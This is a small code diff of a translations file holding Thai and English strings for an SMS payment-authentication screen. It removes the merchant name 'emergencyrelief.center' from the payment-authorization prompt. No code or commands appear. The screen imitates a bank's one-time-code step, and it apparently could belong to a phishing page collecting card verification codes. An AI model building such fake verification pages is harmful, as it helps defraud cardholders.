@@ -246,7 +246,7 @@ export const translations = {
     // SMS Verification
     paymentAuthentication: 'การยืนยันการชำระเงิน',
     smsCodeSent: 'เราได้ส่ง SMS พร้อมรหัสยืนยันไปยังหมายเลขโทรศัพท์ที่ลงทะเบียนไว้ของคุณ',
-    authorizingPayment: 'กำลังอนุมัติการชำระเงินให้กับ emergencyrelief.center สำหรับ',
+    authorizingPayment: 'กำลังอนุมัติการชำระเงินสำหรับ',
     onDate: 'เมื่อวันที่',
     withCardEnding: 'ด้วยบัตรที่ลงท้ายด้วย',
     verificationCode: 'รหัสยืนยัน',
@@ -510,7 +510,7 @@ export const translations = {
     // SMS Verification
     paymentAuthentication: 'Payment Authentication',
     smsCodeSent: 'We have just sent an SMS with a secure code to your registered mobile phone number',
-    authorizingPayment: 'Authorizing a payment to emergencyrelief.center for',
+    authorizingPayment: 'Authorizing a payment for',
     onDate: 'on',
     withCardEnding: 'with your card ending with',
     verificationCode: 'Verification Code',
